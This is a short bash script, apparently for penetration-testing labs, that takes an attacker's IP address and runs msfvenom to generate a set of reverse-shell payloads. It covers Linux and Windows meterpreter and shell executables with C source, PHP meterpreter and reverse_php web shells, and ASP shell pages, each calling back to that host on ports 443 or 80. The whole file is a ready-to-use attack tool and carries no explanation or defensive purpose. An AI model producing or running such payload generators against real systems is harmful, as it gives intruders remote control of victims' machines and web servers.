#!/bin/bash
if [[ $# -eq 0 ]] ; then
    echo "Usage: genshells KaliboxIP"
    exit 0
fi

mkdir ./$@
mkdir ./$@/linux
mkdir ./$@/windows
mkdir ./$@/php
mkdir ./$@/asp

msfvenom -a x86 --platform linux -p linux/x86/meterpreter/reverse_tcp LHOST=$@ LPORT=443 -f elf -o ./$@/linux/linux_mp_rev_tcp_p443.elf
msfvenom -a x86 --platform linux -p linux/x86/meterpreter/reverse_tcp LHOST=$@ LPORT=443 -f c -o ./$@/linux/linux_mp_rev_tcp_p443.c

msfvenom -a x86 --platform linux -p linux/x86/meterpreter/reverse_tcp LHOST=$@ LPORT=80 -f elf -o ./$@/linux/linux_mp_rev_tcp_p80.elf
msfvenom -a x86 --platform linux -p linux/x86/meterpreter/reverse_tcp LHOST=$@ LPORT=80 -f c -o ./$@/linux/linux_mp_rev_tcp_p80.c

msfvenom -a x86 --platform linux -p linux/x86/shell_reverse_tcp LHOST=$@ LPORT=443 -f elf -o ./$@/linux/linux_shell_rev_tcp_p443.elf
msfvenom -a x86 --platform linux -p linux/x86/shell_reverse_tcp LHOST=$@ LPORT=443 -f c -o ./$@/linux/linux_shell_rev_tcp_p443.c

msfvenom -a x86 --platform linux -p linux/x86/shell_reverse_tcp LHOST=$@ LPORT=80 -f elf -o ./$@/linux/linux_shell_rev_tcp_p80.elf
msfvenom -a x86 --platform linux -p linux/x86/shell_reverse_tcp LHOST=$@ LPORT=80 -f c -o ./$@/linux/linux_shell_rev_tcp_p80.c

msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=$@ LPORT=443 -f exe -o ./$@/windows/win_mp_rev_tcp_p443.exe
msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=$@ LPORT=443 -f c -o ./$@/windows/win_mp_rev_tcp_p443.c

msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=$@ LPORT=80 -f exe -o ./$@/windows/win_mp_rev_tcp_p80.exe
msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=$@ LPORT=80 -f c -o ./$@/windows/win_mp_rev_tcp_p80.c

msfvenom -a x86 --platform windows -p windows/shell_reverse_tcp LHOST=$@ LPORT=443 -f exe -o ./$@/windows/win_shell_rev_tcp_p443.exe
msfvenom -a x86 --platform windows -p windows/shell_reverse_tcp LHOST=$@ LPORT=443 -f c -o ./$@/windows/win_shell_rev_tcp_p443.c

msfvenom -a x86 --platform windows -p windows/shell_reverse_tcp LHOST=$@ LPORT=80 -f exe -o ./$@/windows/win_shell_rev_tcp_p80.exe
msfvenom -a x86 --platform windows -p windows/shell_reverse_tcp LHOST=$@ LPORT=80 -f c -o ./$@/windows/win_shell_rev_tcp_p80.c

echo "<?php" > ./$@/php/php_mp_rev_tcp_p443.php
msfvenom -p php/meterpreter_reverse_tcp LHOST=$@ LPORT=443 -f raw >> ./$@/php/php_mp_rev_tcp_p443.php 
echo "?>" >> ./$@/php/php_mp_rev_tcp_p443.php

echo "<?php" > ./$@/php/php_rev_tcp_p443.php
msfvenom -p php/reverse_php LHOST=$@ LPORT=443 -f raw >> ./$@/php/php_rev_tcp_p443.php
echo "?>" >> ./$@/php/php_rev_tcp_p443.php

msfvenom -a x86 --platform windows -p windows/shell_reverse_tcp LHOST=$@ LPORT=443 -f asp -e generic/none -n 18 -o ./$@/asp/win_asp_shell_rev_tcp_443.asp
msfvenom -a x86 --platform windows -p windows/shell_reverse_tcp LHOST=$@ LPORT=80 -f asp -e generic/none -n 18 -o ./$@/asp/win_asp_shell_rev_tcp_80.asp
